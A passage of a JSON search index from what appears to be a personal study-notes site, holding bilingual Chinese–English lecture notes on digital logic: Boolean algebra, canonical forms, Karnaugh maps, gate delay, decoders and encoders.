<p>\u5947\u5076\u6821\u68c0\u7801\uff0c\u5728\u672b\u5c3e\u589e\u52a0\u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff0c\u4fdd\u8bc1\u6574\u4f53 1 \u7684\u4e2a\u6570\u5947\u5076\u6027\u4e00\u81f4\u3002\u63a5\u6536\u7aef\u5224\u65ad 1 \u7684\u5947\u5076\u3002(odd parity and even parity)</p>"},{"location":"cs/computer_logic/chapter1/#gray-code","title":"Gray Code \u683c\u96f7\u7801","text":"<p>\u76f8\u90bb\u4e24\u6570\u4e4b\u95f4\u4e00\u4f4d\u4e0d\u540c\u3002</p> <p>\u65cb\u8f6c\u7f16\u7801\u5668</p> <p>\u5149\u4f20\u611f\u5668\u63a5\u6536\uff0c\u907f\u514d\u51fa\u73b0\u4e2d\u95f4\u7ed3\u679c\uff0c\u6bcf\u6b21\u5230\u8fbe\u4e0b\u4e00\u4e2a\u72b6\u6001\u53ea\u4f1a\u53d8\u4e00\u4f4d\u3002</p>"},{"location":"cs/computer_logic/chapter1/#unicode","title":"UNICODE","text":"<p>16-bit (2-byte)</p>"},{"location":"cs/computer_logic/chapter2/","title":"Combinational Logic Circuits","text":""},{"location":"cs/computer_logic/chapter2/#gate-circuits-and-boolean-equations","title":"Gate Circuits and Boolean Equations","text":""},{"location":"cs/computer_logic/chapter2/#binary-logic-and-gates","title":"Binary Logic and Gates","text":"<p>Binary Variables 1/0, true/false, on/off</p> <p>Logical Operations</p> <ul> <li><code>AND</code> (\\(\\cdot\\))</li> <li><code>OR</code> (+)</li> <li><code>NOT</code> (\\(\\bar A\\) or \\(A'\\) or ~\\(A\\))</li> <li><code>XOR</code> </li> </ul> <p>Truth tables a tabular listing of the values of a function for all possible combinations of values on its arguments.</p> <p>Logic Function Implementation</p> <p>Using Switches \u5f00\u5173\u7535\u8def</p> <p>Logic Gates</p> <p>\u7ee7\u7535\u5668 (relay) \u5b9e\u73b0\u5f00\u5173\u3002\u4e0d\u53ef\u9760\uff0c\u5bff\u547d\u6709\u9650\uff0c\u4f53\u79ef\u5927</p> <p>\u7535\u5b50\u7ba1 (vacuum rube) \u5b9e\u73b0\u5f00\u5173\u3002\u9700\u8981\u9884\u70ed\uff0c\u4f53\u79ef\u5927\uff0c\u5bff\u547d\u6709\u9650</p> <p>\u534a\u5bfc\u4f53 (transistor) \u5b9e\u73b0\u5f00\u5173\u3002</p> \u534a\u5bfc\u4f53 <p>\u5bfc\u7535\u7279\u6027\u5904\u4e8e\u5bfc\u4f53\u548c\u7edd\u7f18\u4f53\u4e4b\u95f4\u3002</p> <p>\u5206\u7c7b</p> <ul> <li> <p>\u672c\u5f81\u534a\u5bfc\u4f53</p> <p>\u4e0d\u542b\u6742\u8d28\u4e14\u5177\u6709\u6676\u4f53\u7ed3\u6784\u7684\u534a\u5bfc\u4f53</p> <p>T = 0K \u65f6\uff0c\u4e0d\u5bfc\u7535</p> </li> <li> <p>\u6742\u8d28\u534a\u5bfc\u4f53</p> <ul> <li> <p>N \u578b\u534a\u5bfc\u4f53 (Negative)</p> <p>\u63ba\u5165 5 \u4ef7\u539f\u5b50\uff0c\u5b58\u5728\u81ea\u7531\u7535\u5b50</p> </li> <li> <p>P \u578b\u534a\u5bfc\u4f53 (Positive)</p> <p>\u63ba\u5165 3 \u4ef7\u539f\u5b50\uff0c\u5b58\u5728\u7535\u5b50\u7a7a\u7f3a</p> </li> </ul> </li> </ul> <p>PN \u7ed3</p> <p>\u4e00\u4fa7 P \u578b\uff0c\u4e00\u4fa7 N \u578b\uff0c\u4ea4\u754c\u5904\u5f62\u6210 PN \u7ed3\uff0c\u4e2d\u95f4\u7535\u5b50\u548c\u7a7a\u7a74\u7ed3\u5408\u3002</p> <ul> <li>\u5916\u52a0\u6b63\u5411\u7535\u538b\uff08\u548c\u5185\u90e8\u7535\u538b\u76f8\u53cd\uff09\uff0cPN \u7ed3\u88ab\u8017\u5c3d\u540e\u7535\u6d41\u5bfc\u901a</li> <li>\u5916\u52a0\u53cd\u5411\u7535\u538b\uff0cPN \u7ed3\u6269\u5927\uff0c\u7535\u6d41\u66f4\u5c0f\u3002\u9971\u548c\u7535\u6d41\u968f\u6e29\u5ea6\u5347\u9ad8\u800c\u53d8\u5316\u3002</li> </ul> <p>\u4f0f\u5b89\u7279\u6027\u66f2\u7ebf\uff1a</p> <p></p> \u4e09\u6781\u7ba1 <p>\u534a\u5bfc\u4f53\u4e09\u6781\u7ba1\u3001\u6676\u4f53\u4e09\u6781\u7ba1\u3002</p> <p>\u5206\u7c7b</p> <ul> <li> <p>NPN \u578b</p> <p></p> <p>\u653e\u5927\u7279\u6027\uff1a\\(I_b = \\beta I_c\\)</p> <p>\u53ef\u770b\u4e3a\u53c8\u57fa\u6781\u63a7\u5236\u7684\u5f00\u5173\uff0c\u57fa\u6781\u7535\u6d41\u5f88\u5c0f\u770b\u4f5c\u65ad\u5f00\uff0c\u7535\u6d41\u5f88\u5927\u770b\u4f5c\u95ed\u5408\u3002</p> </li> <li> <p>PNP \u578b</p> <p></p> </li> </ul> <p>CMOS Circuits \u7535\u538b\u63a7\u5236</p> <p>\u4e0a\u9762 PMOS \u7ba1\uff0c\u5e38\u95ed\uff1b\u4e0b\u9762 NMOS \u7ba1\uff0c\u5e38\u5f00\u3002</p> <p>\u4e0e\u975e(NAND)\u548c\u6216\u975e(NOR)\u95e8\uff08\u80fd\u591f\u6784\u9020\u51fa\u6240\u6709\u903b\u8f91\u5173\u7cfb\uff09</p> <p>\u8f93\u5165\u6bb5\u53ef\u63a5\u5728\u4e00\u8d77\uff0c\u8f93\u51fa\u7aef\u4e0d\u80fd\u63a5\u5728\u4e00\u8d77\uff0c\u53ef\u80fd\u77ed\u8def\u3002</p> <p>Logical Gate Symbols</p> <p>Waveform Behavior in Time</p> <p>Gate Delay</p> <p>\u9650\u5236\u6700\u9ad8\u5de5\u4f5c\u9891\u7387\u3002</p> <p>Logic Diagrams and Expressions</p> <p>\u771f\u503c\u8868\u552f\u4e00\uff0c\u903b\u8f91\u51fd\u6570\u548c\u903b\u8f91\u7535\u8def\u56fe\u6709\u5f88\u591a\u53d8\u5f62\u3002</p>"},{"location":"cs/computer_logic/chapter2/#bool-algebra","title":"Bool Algebra","text":"<p>\u91cd\u70b9\uff1a\\(X + YZ = (X + Y)(X + Z)\\)</p> <p>\u5bf9\u5076\uff1a\u4e0e\u53d8\u6216\uff0c\u6216\u53d8\u4e0e\uff0c0 \u53d8 1 \uff0c\u4f18\u5148\u7ea7\u4e0d\u53d8\uff0c\u975e\u4e0d\u53d8\u3002</p> Boolean Algebraic Proof 1 <p></p> Boolean Algebraic Proof 2 \\[ AB + \\bar A C + BC = AB + \\bar A C \\] \\[ \\begin{align}     AB + \\bar A C + BC &amp;= AB + \\bar A C + BC(A + \\bar A) \\\\                        &amp;= A(B+BC) + \\bar A(C+BC) \\\\                        &amp;= AB + \\bar A C \\end{align} \\] Boolean Algebraic Proof 3 \\[ \\bar{(X+Y)}Z +X\\bar Y = \\bar Y(X+Z) \\] \\[ \\begin{align}     \\bar{(X+Y)}Z +X\\bar Y &amp;= \\bar X \\bar Y Z + X \\bar Y \\\\                           &amp;= \\bar Y (\\bar X Z + X) \\\\                           &amp;= \\bar Y (X + \\bar X)(X + Z) \\\\                           &amp;= \\bar Y(X+Z) \\end{align} \\] <p>Useful Theorems</p> <ul> <li>Minimization: \\(x \\cdot y + \\bar x \\cdot y = y, (x + y)(\\bar x + y) = y\\)</li> <li>Absorption: \\(x + xy = x, x(x+y) = x\\) </li> <li>Simplification: \\(x + \\bar x y = x + y, x(\\bar x + y) = xy\\)</li> <li>Consensus: \\(xy + \\bar xz + yz = xy + \\bar xz\\) \\((x+y)(\\bar x+z)(y+z) = (x+y)(\\bar x+z)\\)</li> <li>DeMorgan's Law: \\(\\overline{x + y} = \\bar x\\bar y, \\overline{xy} = \\bar x + \\bar y\\)</li> </ul> <p>Expression Simplification \u51cf\u5c11\u5ef6\u8fdf\uff0c\u964d\u4f4e\u6210\u672c</p>"},{"location":"cs/computer_logic/chapter2/#standard-forms","title":"Standard Forms","text":"<p>Canonical Forms in common usage:</p> <ul> <li>SOM: Sum of Minterms</li> <li>POM: Product of Maxterm</li> </ul>"},{"location":"cs/computer_logic/chapter2/#minterms-and-maxterms","title":"Minterms and Maxterms","text":"<ul> <li>Minterm: <code>AND</code> terms with every variable present in either true or complemented form.</li> <li>Maxterm: <code>OR</code> terms with every variable in true or complemented form.</li> </ul> <p>Index of minterms and maxterms</p> <p>The index for the minterm or maxterm, expressed as a binary number, is used to determine whether the variable is shown in the true form or complemented form.</p> <p>For Minterms:</p> <ul> <li>\"1\" means the variable is \"Not Complemented\" (\\(x\\))</li> <li>\"0\" means the variable is \"Complemented\" (\\(\\bar x\\))</li> </ul> <p>For Maxterms, the situation is opposite.</p> <p>Use subscript to show index and \"m\" for Minterm, \"M\" for Maxterm. \\(M_i = \\bar m_i\\).</p> <p>Function Tables for both</p>"},{"location":"cs/computer_logic/chapter2/#canonical-forms","title":"Canonical Forms","text":"<p>Canonical Sum of Minterms</p> <ul> <li>For the function table, the minterms used are the terms corresponding to the 1's</li> <li>For expressions, expand all terms first to explicitly list all minterms. Do this by \"ANDing\" any term missing a variable v with a term \\(v + \\bar v\\)</li> </ul> <p>Example</p> <p>Implement \\(f = x + \\bar x \\bar y\\) as a SOM.</p> <ul> <li>\\(f = x (y + \\bar y) + \\bar x \\bar y\\)</li> <li>\\(f = xy + x \\bar y + \\bar x \\bar y\\)</li> <li>\\(f = m_3 + m_2 + m_0\\) or \\(f(x, y, z) = \\sum_m(0, 2, 3)\\)</li> </ul> <p>Canonical Product of Maxterms</p> <ul> <li>For the function table, the maxterms used are the terms corresponding to the 0's</li> <li>For expressions, expand all terms first to explicitly list all maxterms. Do this by \"ORing\" any term missing a variable v with a term \\(v \\bar v\\)</li> </ul> <p>Example</p> <p>Implement \\(f = x + \\bar x \\bar y\\) as a POM.</p> <ul> <li>\\(f(x, y, z) = (x + bar x)(x + \\bar y) = x + \\bar y\\)</li> <li>\\(f = x + \\bar y + 0 = x + \\bar y + z \\bar z\\)</li> <li>\\(f = (x + \\bar y + z)(x + \\bar y + \\bar z)\\)</li> <li>\\(f = M_2 M_3 = \\prod_M (2, 3)\\)</li> </ul> <p>Function Complements</p> <p>The complement of a function expressed as a sum of minterms is constructed by selecting the minterms missing in the sum-of-minterms canonical forms.</p> <p>Minterm \u548c Maxterm \u5728\u771f\u503c\u8868\u4e2d\u9009\u62e9\u7684\u9879\u4e92\u8865\uff0c\u53ef\u4ee5\u901a\u8fc7 SOM \u63a8\u7b97\u51fa POM\u3002</p> <p>Note</p> <p>Method to get maxterm.</p> <p>\u5148\u5316\u6210 SOM\uff0c\u518d\u9009\u53d6\u4e92\u8865\u7684\u9879\u7b97\u51fa POM\u3002</p> <ul> <li>\\(F(x, y, z) = \\sum_m(1,3,5,7)\\)</li> <li>\\(F(x,y,z) = \\prod_M(0,2,4,6)\\)</li> </ul> <p>Standard Forms</p> <ul> <li>Standard Sum-of-Products (SOP) form: equations are written as an OR of AND terms</li> <li>Standard Product-of-Sums (POS) form: equations are written as an AND of OR terms</li> </ul> <p>SOP and POS are two-level network of gates. \u4e00\u7ea7\u6216\u95e8\u518d\u4e00\u7ea7\u4e0e\u95e8\uff08\u6216\u8005\u76f8\u53cd\uff09\uff0c\u6700\u5c11\u5c42\u6b21\u7684\u7535\u8def\u5b9e\u73b0\u65b9\u6cd5\u3002</p> <p>\u76ee\u7684\uff1a\u51cf\u5c11\u5ef6\u8fdf\u3001\u6210\u672c\u3002</p>"},{"location":"cs/computer_logic/chapter2/#circuit-optimization","title":"Circuit Optimization","text":"<p>Goal: To obtain the simplest implementation for a given function.</p> <p>Requires a cost criterion to measure the simplicity of a circuit.</p>"},{"location":"cs/computer_logic/chapter2/#two-level-optimization","title":"Two-Level Optimization","text":"<p>Cost criteria:</p> <ul> <li>\\(L\\) - Literal cost</li> <li>\\(G\\) - Gate input cost</li> <li>\\(GN\\) - Gate input cost with NOTs</li> </ul>"},{"location":"cs/computer_logic/chapter2/#literal-cost","title":"Literal Cost","text":"<p>The number of literal appearances in a Boolean expression corresponding to the logic circuit diagram.</p> <p>\u5f0f\u4e2d\u53d8\u91cf\u603b\u4e2a\u6570\u5373\u4e3a Literal Cost.</p>"},{"location":"cs/computer_logic/chapter2/#gate-input-cost","title":"Gate Input Cost","text":"<p>The number of inputs to the gates in the implementation corresponding exactly to the given equation or equations.</p> <p>Consist of:</p> <ul> <li>All literal appearances</li> <li>The number of terms excluding single literal terms (G)</li> <li>Optionally, the number of distinct complemented single literals (GN)</li> </ul> <p>Example</p> <ul> <li>\\(F = BD + A\\bar BC + A\\bar C \\bar D \\qquad L = 8, G = 11, GN = 14\\)</li> <li>\\(F = (A +\\bar B)(A + D)(B + C + \\bar D)(\\bar B + \\bar C + D) \\qquad L = 10, G = 14, GN = 18\\)</li> </ul> <p>Cost Criteria</p> <p> </p>"},{"location":"cs/computer_logic/chapter2/#map-manipulation","title":"Map Manipulation","text":"<p>Karnaugh Maps(K-map)</p> <p>A K-map is a collection of squares</p> <ul> <li>Each square represents a minterm</li> <li>The collection of squares is a graphical representation of a Boolean function</li> <li>Adjacent squares differ in the value of one variable</li> <li>Alternative algebraic expressions for the same function are derived by recognizing patterns of squares</li> </ul>"},{"location":"cs/computer_logic/chapter2/#two-variable-maps","title":"Two Variable Maps","text":"<p>K-Map Function Representation</p> <p>\\(F(x,y) = x\\bar y + xy\\)</p> <p></p> <p>Then \\(F(x,y) = x\\bar y + xy = x\\)</p>"},{"location":"cs/computer_logic/chapter2/#three-variable-maps","title":"Three Variable Maps","text":"<p>Note</p> <p>Topological warps of 3-variable K-maps that show all adjacencies:</p> <p></p>"},{"location":"cs/computer_logic/chapter2/#four-variable-maps","title":"Four Variable Maps","text":"<p>Example Shapes of Rectangles (WXYZ)</p>"},{"location":"cs/computer_logic/chapter2/#five-variable-or-more-k-maps","title":"Five Variable or More K-Maps","text":"<p>For five variable problems, we use two adjacent K-maps.(VWXYZ)</p>"},{"location":"cs/computer_logic/chapter2/#dont-cares-in-k-maps","title":"Don't Cares in K-Maps","text":"<p>\u53ef\u80fd\u6709\u65e0\u5173\u9879\uff0c\u8f93\u5165\u65e0\u5173\u8f93\u5165\u7ec4\u5408\u65f6\uff0c\u8f93\u51fa\u662f 0 \u662f 1 \u90fd\u65e0\u6240\u8c13\u3002\u5728 K-map \u4e2d\u7528 <code>x</code> \u8868\u793a\uff0c\u53ef\u753b\u5165\u4e5f\u53ef\u4e0d\u753b\u5165\u5361\u8bfa\u5708\u4e2d\uff08\u53d6\u51b3\u4e8e\u662f\u5426\u80fd\u5316\u5230\u6700\u7b80\uff09</p> <p>Example</p> <p>\\(F(A,B,C,D) = \\sum_m(3,9,11,12,13,14,15) + \\sum_d(1,4,6)\\)</p> <ul> <li>Find the optimum SOP solution    \\(F = AB + \\bar BD\\)</li> <li>Find the optimum POS solution    \\(F = (B + D)(A + \\bar B)\\)</li> </ul>"},{"location":"cs/computer_logic/chapter2/#systematic-simplification","title":"Systematic Simplification","text":"<p>A Prime Implicant (\u8d28\u8574\u6db5\u9879) is a product term obtained by combining the maximum possible number of adjacent squares in the map into a rectangle with the number of squares a power of 2.</p> <p>A prime implicant is called an Essential Prime Implicant if it is the only prime implicant that covers (includes) one or more minterms.</p> <p>\u8d28\u8574\u6db5\u9879\u662f\u80fd\u591f\u6846\u4f4f\u67d0\u4e2a <code>1</code> \u7684\u6700\u5927\u5361\u8bfa\u5708\u3002\u5bf9\u67d0\u4e2a <code>1</code> \u800c\u8a00\u5982\u679c\u5b83\u7684\u8d28\u8574\u6db5\u9879\u53ea\u6709\u4e00\u4e2a\uff0c\u90a3\u4e48\u5b83\u662f\u5fc5\u8981\u7684\u3002</p> <p>Example</p> <p></p>"},{"location":"cs/computer_logic/chapter2/#multi-level-circuit-optimization","title":"Multi-Level Circuit Optimization","text":"<p>\u4e8c\u7ea7\u95e8\u4f20\u8f93\u5ef6\u8fdf\u6700\u5c0f\uff0c\u4f46\u95e8\u8f93\u5165\u6210\u672c\u9ad8\u3002</p> <p>\u591a\u7ea7\u95e8\u4f20\u8f93\u5ef6\u8fdf\u8f83\u9ad8\uff0c\u4f46\u95e8\u8f93\u5165\u6210\u672c\u4f4e\u3002</p> <p>\u5982\u4f55\u8bbe\u8ba1\uff0c\u53d6\u51b3\u4e8e\u9700\u8981\u964d\u4f4e\u4f20\u8f93\u5ef6\u8fdf\u8fd8\u662f\u95e8\u8f93\u5165\u6210\u672c\u3002</p> <p>Transformation Examples</p> <p> \u6700\u540e\u5316\u4e3a\u4e09\u7ea7\u95e8\u7535\u8def\uff0c\u95e8\u8f93\u5165\u6210\u672c\u964d\u4f4e\u3002</p>"},{"location":"cs/computer_logic/chapter2/#additional-gates-and-circuits","title":"Additional Gates and Circuits","text":""},{"location":"cs/computer_logic/chapter2/#integrated-circuits","title":"Integrated Circuits","text":"<p>\u96c6\u6210\u7535\u8def</p> <p>Integrated circuit (informally, a \u201cchip\u201d) is a semiconductor crystal (most often silicon) containing the electronic components for the digital gates and storage elements which are interconnected on the chip.</p> <p>\u5206\u7c7b\uff1a</p>"},{"location":"cs/computer_logic/chapter2/#technology-parameters","title":"Technology Parameters","text":"<ul> <li>Fan-in The number of inputs available on a gate</li> <li>Fan-out The number of standard loads driven by a gate output</li> <li>Logic Levels The signal value ranges for 1 and 0 on the inputs and 1 and 0 on the outputs</li> <li>Noise Margin the maximum external noise voltage superimposed on a normal input value that will not cause an undesirable change in the circuit output</li> <li>Cost for a gate a measure of the contribution by the gate to the cost of the integrated circuit</li> <li>Propagation Delay The time required for a change in the value of a signal to propagate from an input to an output</li> <li>Power Dissipation The amount of power drawn from the power supply and consumed by the gate</li> </ul>"},{"location":"cs/computer_logic/chapter2/#fan-out","title":"Fan-out","text":"<p>The number of standard loads driven by a gate output</p> <p>\u4e00\u4e2a\u95e8\u7684\u8f93\u51fa\u80fd\u5e26\u52a8\u591a\u5c11\u95e8\u7684\u8f93\u5165</p> <p>\u8861\u91cf\u6247\u51fa\u7cfb\u6570\uff1a</p> <p>Transition time - the time required for the gate output to change from H to L, \\(t_{HL}\\), or from L to H, \\(t_{LH}\\)</p> <p>\u5e26\u7684\u95e8\u8d8a\u591a\uff0c\u4e0a\u5347\u4e8b\u4ef6\u5c31\u8d8a\u957f\u3002\u89c4\u5b9a\u4e0a\u5347\u4e0b\u964d\u6700\u5927\u65f6\u95f4\uff0c\u4ece\u800c\u5f97\u51fa maximum fan-out \u6700\u5927\u6247\u51fa\u7cfb\u6570\u3002</p>"},{"location":"cs/computer_logic/chapter2/#cost","title":"Cost","text":"<p>In integrated circuits, chip area, number and size of the transistors, amount of wiring, gate input count</p> <p>\u4e3b\u8981\u7531\u95e8\u8f93\u5165\u6210\u672c\u51b3\u5b9a\u3002</p>"},{"location":"cs/computer_logic/chapter2/#propagation-delay","title":"Propagation Delay","text":"<p>Delay is usually measured at the 50% point with respect to the H and L output voltage levels</p> <p>\u8f93\u5165\u53d8\u5316\u5230\u8f93\u51fa\u53d8\u5316\u7684\u65f6\u95f4\u3002\u901a\u5e38\u4ece\u4e0a\u5347\u6216\u4e0b\u964d 50% \u5904\u5f00\u59cb\u8ba1\u7b97\u3002</p> <ul> <li>High-to-Low \\(t_{PHL}\\) \u8f93\u51fa \u4ece\u9ad8\u7535\u5e73\u5230\u4f4e\u7535\u5e73\u7684\u65f6\u95f4</li> <li>Low-to-High \\(t_{PLH}\\) \u8f93\u51fa \u4ece\u4f4e\u7535\u5e73\u5230\u9ad8\u7535\u5e73\u7684\u65f6\u95f4</li> </ul> <p>Propagation Delay of <code>NOT</code></p> <p></p>"},{"location":"cs/computer_logic/chapter2/#delay-models","title":"Delay Models","text":"<ul> <li>Transport delay \u4f20\u8f93\u5ef6\u8fdf change in the output in response to a change on the inputs occurs after a fixed specified delay</li> <li> <p>Inertial delay \u60ef\u6027\u5ef6\u8fdf similar to transport delay, except that if the input changes such that the output is to change twice in a time interval less than the  rejection time, the output changes do not occur. Models typical electronic circuit behavior, namely, rejects narrow \u201cpulses\u201d on the outputs</p> <p>\u5f88\u5c0f\u7684\u8109\u51b2\u8df3\u53d8\u4f1a\u88ab\u6d88\u9664\u3002</p> </li> </ul> <p>Example</p> <p></p>"},{"location":"cs/computer_logic/chapter2/#circuit-delay","title":"Circuit Delay","text":"<p>Example</p> <p>  \u8003\u8651\u4f20\u8f93\u5ef6\u8fdf\uff0c\u8f93\u51fa\u6ce2\u5f62\u6539\u53d8\u3002</p> <p>\\(S\\) \u7684\u4e24\u6761\u8def\u5f84\u5ef6\u8fdf\u4e0d\u540c\uff0c\\(Y\\) \u5904\u4ea7\u751f\u5c16\u5cf0\uff0c\u79f0\u4e3a\u7535\u8def\u8fdb\u884c\u7684 \u7ade\u4e89\u5192\u9669</p>"},{"location":"cs/computer_logic/chapter2/#fan-out-and-delay","title":"Fan-out and Delay","text":"<p>The fan-out loading a gate\u2019s output affects the gate\u2019s propagation delay</p> <p>standard load: \u5e26\u4e00\u4e2a\u975e\u95e8\u6240\u9700\u8981\u7684\u8d1f\u8f7d\u3002</p> <p>Example</p> <p>One realistic equation for \\(t_{pd}\\) for a NAND gate with 4 inputs is</p> \\[ t_{pd} = 0.07 + 0.021 SL \\text{ns} \\] <p>\\(SL\\): the number of standard loads the gate is driving.</p>"},{"location":"cs/computer_logic/chapter2/#costperformance-tradeoffs","title":"Cost/Performance Tradeoffs","text":"<p>Gate-Level Example</p> <p>NAND gate G with 20 standard loads on its output has a delay of 0.45 ns and has a normalized cost of 2.0.</p> <p>A buffer H has a normalized cost of 1.5. The NAND gate driving the buffer with 20 standard loads gives a total delay of 0.33 ns.</p> <p>In which if the following cases should the buffer be added?</p> <ol> <li>The cost of this portion of the circuit cannot be more than 2.5</li> <li>The delay of this portion of the circuit cannot be more than 0.40 ns</li> <li>The delay of this portion of the circuit must be less than 0.40 ns and the cost less than 3.0</li> </ol> <p>Answer:</p> <ol> <li>No buffer</li> <li>Need buffer</li> <li>Cannot achieve by using buffer or not</li> </ol> <p>Tradeoffs can also be accomplished much higher in the design hierarchy.</p> <p>Constraints on cost and performance have a major role in making tradeoffs.</p>"},{"location":"cs/computer_logic/chapter2/#other-gate-types","title":"Other Gate Types","text":"<ul> <li> <p>Buffer \u7f13\u51b2\u5668 \\(F = X\\)</p> <p>\u4f5c\u7528\uff1a\u6269\u5927\u6247\u51fa\u7cfb\u6570\uff0c\u51cf\u5c11\u4f20\u8f93\u5ef6\u8fdf\uff0c\u63d0\u9ad8\u8d1f\u8f7d\u80fd\u529b\u3002</p> </li> <li> <p>NAND gate \u4e0e\u975e\u95e8 \\(F = \\overline{XY}\\)</p> <p>\u4f5c\u7528\uff1a\u5b9e\u73b0\u4efb\u610f\u903b\u8f91\u51fd\u6570\uff0c\u51cf\u5c11\u95e8\u8f93\u5165\u6210\u672c\u3002</p> </li> <li> <p>NOR gate \u6216\u975e\u95e8 \\(F = \\overline{X + Y}\\)</p> <p>\u5bf9\u5076\u5173\u7cfb</p> </li> <li> <p>Exclusive-OR gate \u5f02\u6216\u95e8 \\(F = X \\oplus Y\\)</p> <p>Exclusive-NOR gate \u5f02\u6216\u975e\u95e8\uff08\u540c\u6216\u95e8\uff09 \\(F = \\overline{X \\oplus Y}\\)</p> <p>\\(X \\oplus Y = X \\bar{Y} + \\bar{X}Y\\), \\(\\overline{X \\oplus Y} = XY + \\bar{X}\\bar{Y}\\)</p> </li> </ul>"},{"location":"cs/computer_logic/chapter2/#exclusive-or-operator-and-gates","title":"Exclusive-OR Operator and Gates","text":"<ul> <li> <p>XOR identities</p> \\[ X \\oplus Y \\oplus Z = \\bar X \\bar Y Z + \\bar X Y \\bar Z + X \\bar Y \\bar Z + XYZ \\] \\[ X \\oplus \\bar Y = \\overline{X \\oplus Y} \\] \\[ X \\oplus 0 = X, X \\oplus 1 = \\bar X \\text{\uff08\u53ef\u63a7\u975e\u95e8\uff09} \\] </li> <li> <p>XOR implementation</p> <p></p> <p></p> </li> <li> <p>Odd and Even Functions</p> <p>Odd Function: \\(F = 1\\) if and only if the index of the minterm has an odd number of 1s</p> <p>Even Function: \\(F = 1\\) if and only if the index of the minterm has an even number of 1s</p> <p>The not of an odd function is an even function, and vice versa.</p> </li> <li> <p>Parity Generators and Checkers \u5947\u5076\u6821\u9a8c</p> <p>Parity Generator: \\(P = X \\oplus Y \\oplus Z\\)</p> <p>Parity Checker: \\(F = X \\oplus Y \\oplus Z \\oplus P\\)</p> </li> </ul>"},{"location":"cs/computer_logic/chapter2/#high-impedance-outputs","title":"High-Impedance Outputs","text":"<p>\u5230 VCC \u548c GND \u7684\u7535\u963b\u90fd\u5f88\u5927\uff0c\u76f8\u5f53\u4e8e\u65ad\u8def\u3002\u7b80\u79f0 <code>Hi-Z</code>\u3002</p> <p>The 3-State Buffer \u771f\u503c\u8868\uff1a</p> Enable Input Output 0 X Hi-Z 1 0 0 1 1 1"},{"location":"cs/computer_logic/chapter3/","title":"Combinational Logic Design","text":""},{"location":"cs/computer_logic/chapter3/#combinational-logic","title":"Combinational Logic","text":""},{"location":"cs/computer_logic/chapter3/#functions-and-functional-blocks","title":"Functions and Functional Blocks","text":"<p>verilog \u4e2d\uff0c\u8c03\u7528\u6a21\u5757\u4f1a\u5728\u7535\u8def\u4e2d\u589e\u52a0\u5b9e\u4f8b\uff0c\u4f1a\u589e\u52a0\u5f00\u9500\u3002</p> <p>verilog \u4e2d\u5e76\u884c\u8fd0\u884c\u3002</p>"},{"location":"cs/computer_logic/chapter3/#multiple-bit-rudiementary-functions","title":"Multiple-bit Rudiementary Functions","text":"<p>A wide line is used to represent a bus (\u603b\u7ebf). The bus can be split into individual lines.</p>"},{"location":"cs/computer_logic/chapter3/#enable-function","title":"Enable Function","text":"<p>\u4e0e\u95e8 + \u975e\u95e8</p>"},{"location":"cs/computer_logic/chapter3/#decoding","title":"Decoding \u8bd1\u7801","text":"<p>the conversion of an n-bit input code to an m-bit output code with \\(n \\leq m \\leq 2^n\\) such that each valid code word produces a unique output code</p> <p>Example:</p> <ul> <li> <p>1-to-2-line decoder</p> <p></p> </li> <li> <p>2-to-4-line decoder</p> <p></p> </li> </ul> <p>\u884c\u5217\u8bd1\u7801\u5668\uff1a\u5c06\u8f93\u5165\u4e0d\u65ad\u4e8c\u5206\uff0c\u4f8b\u5982 4-to-16 \u62c6\u6210 2-to4 \u548c 2-to-4\uff0c\u518d\u5c06 2-to-4 \u62c6\u6210 1-to-2 \u548c 1-to-2\u3002</p>"},{"location":"cs/computer_logic/chapter3/#logic-functions-implementation","title":"Logic Functions Implementation","text":"<p>\u5b9e\u73b0\u4efb\u610f\u903b\u8f91\u51fd\u6570\uff1a\u8bd1\u7801\u5668 + \u6216\u95e8</p> <p>\u8bd1\u7801\u5668\u8f93\u51fa\u662f\u6240\u6709\u6700\u5c0f\u9879\uff0c\u901a\u8fc7\u6216\u95e8\u5b9e\u73b0\u903b\u8f91\u51fd\u6570\u3002</p>"},{"location":"cs/computer_logic/chapter3/#bcd-to-segment-decoder","title":"BCD-to-Segment Decoder","text":"<p>Implement:</p> <ul> <li> <p>Common anode \u5171\u9633\u6781: </p> <ul> <li>\u63a7\u5236\u4eae\uff1aLED \u53e6\u4e00\u7ea7\u63a5\u4f4e\u7535\u5e73(0)</li> <li>\u63a7\u5236\u706d\uff1aLED \u53e6\u4e00\u7ea7\u63a5\u9ad8\u7535\u5e73(1)</li> </ul> </li> <li> <p>Common cathode \u5171\u9634\u6781</p> <ul> <li>\u63a7\u5236\u4eae\uff1aLED \u53e6\u4e00\u7ea7\u63a5\u9ad8\u7535\u5e73(1)</li> <li>\u63a7\u5236\u706d\uff1aLED \u53e6\u4e00\u7ea7\u63a5\u4f4e\u7535\u5e73(0)</li> </ul> </li> </ul>"},{"location":"cs/computer_logic/chapter3/#encoding","title":"Encoding \u7f16\u7801","text":"<p>the conversion of an m-bit input code to an n-bit output code with \\(m \\geq n\\) such that each valid code word produces a unique output code (index to code)</p>"},{"location":"cs/computer_logic/chapter3/#decimal-to-bcd-encoder","title":"Decimal-to-BCD Encoder","text":"<ul> <li>Input: 10 bits (0-9)</li> <li>Output: 4 bits (0000-1001)</li> <li>Function: if input bit \\(D_i\\) is 1, then output \\((A_3, A_2, A_1, A_0)\\) is the BCD code for \\(i\\).</li> </ul> <p>Commonly don't use truth table.</p> <p>Equations:</p> \\[\\begin{align} A_0 &amp;= D_1 + D_3 + D_5 + D_7 + D_9 \\\\ A_1 &amp;= D_2 + D_3 + D_6 + D_7 \\\\ A_2 &amp;= D_4 + D_5 + D_6 + D_7 \\\\ A_3 &amp;= D_8 + D_9 \\end{align}\\]"},{"location":"cs/computer_logic/chapter3/#priority-encoder","title":"Priority Encoder","text":"<p>Accepts multiple inputs and use the highest priority input.</p> <p>where \\(V\\) indicates at least one 1 present.</p> <p>Use K-map to get equations:</p> \\[\\begin{align} F_1 &amp;= D_3 + D_2 \\\\ A_2 &amp;= D_4 \\\\ A_1 &amp;= \\bar D_4 D_3 + \\bar D_4 \\bar D_3 D_2 = \\bar D_4 F_1 \\\\ A_0 &amp;= \\bar D_4 D_3 + \\bar D_4 \\bar D_3 \\bar D_2 D_1 = \\bar D_4 (D_3 + \\bar D_2 D_1) \\\\ V &amp;= D_4 + F_1 + D_1 + D_0 \\end{align}\\]"},{"location":"cs/computer_logic/chapter3/#multiplexers","title":"Multiplexers \u591a\u8def\u9009\u62e9\u5668","text":"<p>A multiplexer selects information from an input line and directs the information to an output line.</p> <p>Decoder + 